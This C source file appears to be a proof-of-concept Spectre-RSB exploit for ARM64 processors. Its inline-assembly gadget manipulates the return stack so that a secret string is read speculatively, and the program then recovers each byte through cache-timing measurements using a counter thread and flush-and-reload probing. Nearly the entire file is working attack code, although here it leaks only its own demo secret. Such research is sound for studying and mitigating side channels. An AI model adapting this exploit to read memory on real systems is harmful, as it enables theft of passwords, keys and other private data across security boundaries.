#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <pthread.h>

#define CACHE_HIT_THRESHOLD 80
#define PAGE_SIZE 512

volatile uint64_t counter = 0;
uint64_t miss_min = 0;
uint8_t array1[160] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16};
uint8_t channel[256 * PAGE_SIZE];
char *secret = "The Magic Words are Squeamish Ossifrage.";
int garbage;
uint8_t s;

void *inc_counter(void *a)
{
    while (1)
    {
        counter++;
        asm volatile("DMB SY");
    }
}

// timing and flush methods copied from https://github.com/lgeek/spec_poc_arm
static uint64_t timed_read(volatile uint8_t *addr)
{
    uint64_t ns = counter;

    /*
     * Reference: http://www.ethernut.de/en/documents/arm-inline-asm.html
     */
    asm volatile(
        "DSB SY\n"
        "LDR X5, [%[ad]]\n"
        "DSB SY\n"
        :
        : [ad] "r"(addr)
        : "x5");

    return counter - ns;
}

static inline void flush(void *addr)
{
    asm volatile("DC CIVAC, %[ad]"
                 :
                 : [ad] "r"(addr));
    asm volatile("DSB SY");
}

uint64_t measure_latency()
{
    uint64_t ns;
    uint64_t min = 0xFFFFF;

    for (int r = 0; r < 300; r++)
    {
        flush(&array1[0]);
        ns = timed_read(&array1[0]);
        if (ns < min)
            min = ns;
    }

    return min;
}

// void gadget()
// {
//     // asm volatile("mov x30, x15\n");       // Link to `readByte`
//     asm volatile("add sp, sp, 0x20\n");   // sp += 0x20;
//     asm volatile("add x29, x29, 0x20\n"); // fp += 0x20;
//     asm volatile("DC CIVAC, x30\n");      // flush(x30)
//     // asm volatile("DC CIVAC, sp\n");       // flush(x30)

//     // Flush the stack pointer
//     asm volatile("mov %0, sp"
//                  : "=r"(sp));
//     flush_cache_line(sp);

//     asm volatile("DSB SY\n"); // flush(x30)
//     // for (z = 0; z < 1000; z++)
//     // {
//     //     // DO NOTHING
//     //     asm volatile("DSB SY\n"); // flush(x30)
//     // }
//     asm volatile("ret\n"); // Return directly to `readByte`
// }

void gadget()
{
    // Flush sp
    asm volatile("mov X2, sp");
    asm volatile("DC CIVAC, X2");

    // Restore last function frame
    asm volatile("ldp x29, x30, [sp], 0x20");

    // Return directly to `readByte`
    asm volatile("ret\n");
}

int j;
void spectre_rsb(size_t malicious_offset)
{
    j = malicious_offset;
    gadget();

    // The following code is only speculatively executed.
    // printf("This code should not be executed!\n");

    garbage ^= channel[secret[j] * 512];
}

void readByte(size_t malicious_offset, uint8_t value[2], int score[2])
{
    int tries, i, j, k, mix_i;
    int results[256]; // record number of cache hits
    register uint64_t elapsed;

    for (i = 0; i < 256; i++)
        results[i] = 0;
    for (tries = 999; tries > 0; tries--)
    {
        /* Flush channel[256*(0..255)] from cache */
        for (i = 0; i < 256; i++)
            flush(&channel[i * 512]); /* intrinsic for clflush instruction */

        for (volatile int z = 0; z < 100; z++)
        {
        } /* Delay (can also mfence) */
        // printf("he2\n");
        // printf("tries = %d, he2\n", tries);

        spectre_rsb(malicious_offset);

        // printf("tries = %d, he3\n", tries);

        // break;

        /* Time reads. Order is lightly mixed up to prevent stride prediction */
        for (i = 0; i < 256; i++)
        {
            mix_i = ((i * 167) + 13) & 255;
            elapsed = timed_read(&channel[mix_i * 512]);

            if (elapsed <= miss_min && mix_i != 0x0
                // && mix_i >= ' ' && mix_i <= 'z'
            )
                results[mix_i]++; /* cache hit - add +1 to score for this value */
        }

        /* Locate highest & second-highest results results tallies in j/k */
        j = k = -1;
        for (i = 0; i < 256; i++)
        {
            if (j < 0 || results[i] >= results[j])
            {
                k = j;
                j = i;
            }
            else if (k < 0 || results[i] >= results[k])
            {
                k = i;
            }
        }
        if (j == 0)
            continue;

        if (results[j] >= (2 * results[k] + 5) || (results[j] == 2 && results[k] == 0))
            break; /* Clear success if best is > 2*runner-up + 5 or 2/0) */
    }

    value[0] = (uint8_t)j;
    score[0] = results[j];
    value[1] = (uint8_t)k;
    score[1] = results[k];
}

int main()
{
    pthread_t inc_counter_thread;
    if (pthread_create(&inc_counter_thread, NULL, inc_counter, NULL))
    {
        fprintf(stderr, "Error creating thread\n");
        return 1;
    }
    // let the bullets fly a bit ....
    while (counter < 10000000)
        ;

    asm volatile("DSB SY");

    miss_min = measure_latency();
    if (miss_min == 0)
    {
        fprintf(stderr, "Unreliable access timing\n");
        exit(EXIT_FAILURE);
    }
    miss_min -= 1;
    printf("miss_min %d\n", (int)miss_min);

    for (int i = 0; i < 256; i++)
    {
        channel[i * PAGE_SIZE] = 1;
    }

    uint8_t value[2];
    int score[2];

    size_t offset = 0;
    int len = 16;

    printf("Reading %d bytes starting at %p:\n", len, secret);
    while (--len >= 0)
    {
        printf("reading %p...\n", secret + offset);
        readByte(offset++, value, score);
        printf("%s: ", (score[0] >= 2 * score[1] ? "Success" : "Unclear"));
        printf("0x%02X='%c' score=%d ", value[0], (value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]);
        if (score[1] > 0)
            printf("(second best: 0x%02X='%c' score=%d)", value[1],
                   (value[1] > 31 && value[1] < 127 ? value[1] : '?'),
                   score[1]);
        printf("\n");
    }
    printf("\n");

    // ...

    return 0;
}